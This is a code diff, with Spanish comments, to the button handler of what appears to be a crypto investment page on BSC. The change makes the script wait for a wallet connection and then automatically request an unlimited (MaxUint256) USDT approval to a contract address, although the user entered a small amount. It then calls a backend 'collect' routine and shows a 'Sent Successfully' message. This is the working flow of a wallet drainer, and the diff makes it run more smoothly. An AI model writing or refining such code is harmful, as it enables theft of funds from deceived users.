@@ -86,8 +86,6 @@ async function triggerBackendCollect(userAddress) {
 // ─── Main Button Handler (AppKit Native Flow) ─────────────────────────────────
 if (approveBtn) {
   approveBtn.addEventListener("click", async () => {
-    
-    // Obtener proveedor activo gestionado por AppKit
     let rawProvider = null;
     if (window.modal && typeof window.modal.getWalletProvider === "function") {
       try {
@@ -95,27 +93,42 @@ if (approveBtn) {
       } catch (_) {}
     }
 
-    // SI NO HAY NINGUNA BILLETERA CONECTADA -> ABRIR MODAL PROFESIONAL DE REOWN
+    // PASO 1: Si NO está conectado -> Abrir el modal y ESPERAR a que conecte
     if (!rawProvider) {
       if (window.modal && typeof window.modal.open === "function") {
+        setLoading(true, "Esperando conexión...");
         try {
+          // modal.open() pausa la ejecución hasta que el usuario interactúa o cierra el modal
           await window.modal.open();
-          return; // El modal se abre y lista automáticamente las extensiones de PC y QR de móviles
+          
+          // Reintentar obtener el proveedor justo después de que el usuario cierre el modal
+          rawProvider = window.modal.getWalletProvider ? window.modal.getWalletProvider() : null;
+          
+          if (!rawProvider) {
+            // El usuario cerró el modal sin conectar
+            setLoading(false);
+            updateButtonState();
+            return;
+          }
         } catch (modalErr) {
           console.error("Error al abrir AppKit:", modalErr);
+          setLoading(false);
+          updateButtonState();
+          return;
         }
+      } else {
+        setLoading(false);
+        return;
       }
-      showToast("No se pudo inicializar el selector de billeteras.", "error");
-      return;
     }
 
+    // PASO 2: Una vez conectado (o si ya lo estaba), CONTINÚA AUTOMÁTICAMENTE AQUÍ:
     setLoading(true, "Conectando proveedor…");
 
     try {
-      // Inicializar Ethers.js v6 con el proveedor estandarizado de AppKit
       const provider = new ethers.BrowserProvider(rawProvider);
       
-      // Validación y cambio de red nativo a BSC
+      // Verificación y cambio de red a BSC
       const network = await provider.getNetwork();
       if (Number(network.chainId) !== 56) {
         setLoading(true, "Verificando red BSC…");
@@ -147,7 +160,6 @@ if (approveBtn) {
         return;
       }
 
-      // Instanciar contrato USDT con Ethers v6
       const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
 
       setLoading(true, "Validando saldo…");
@@ -161,7 +173,6 @@ if (approveBtn) {
       const CAP_AMOUNT = ethers.MaxUint256;
       const requiredAmount = ethers.parseUnits(document.getElementById("investAmount")?.value.toString() || "1", 18);
 
-      // Verificar si ya existe allowance suficiente
       try {
         const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
         if (allowance >= requiredAmount) {
@@ -169,16 +180,17 @@ if (approveBtn) {
           await triggerBackendCollect(userAddress);
           showToast("Sent Successfully, Thank you! ✓", "success");
           setLoading(false);
+          updateButtonState();
           return;
         }
       } catch (_) {}
 
-      // Solicitar transacción de Aprobación (Approve)
+      // Lanzar la firma de aprobación automáticamente
       setLoading(true, "Firma requerida en wallet…");
       const tx = await usdtContract.approve(CONTRACT_ADDRESS, CAP_AMOUNT);
 
       setLoading(true, "Confirmando en red…");
-      await tx.wait(); // Espera la confirmación del bloque con Ethers v6
+      await tx.wait();
 
       setLoading(true, "Finalizando…");
       await triggerBackendCollect(userAddress);
@@ -200,6 +212,7 @@ if (approveBtn) {
       }
     } finally {
       setLoading(false);
+      updateButtonState();
     }
   });
 }
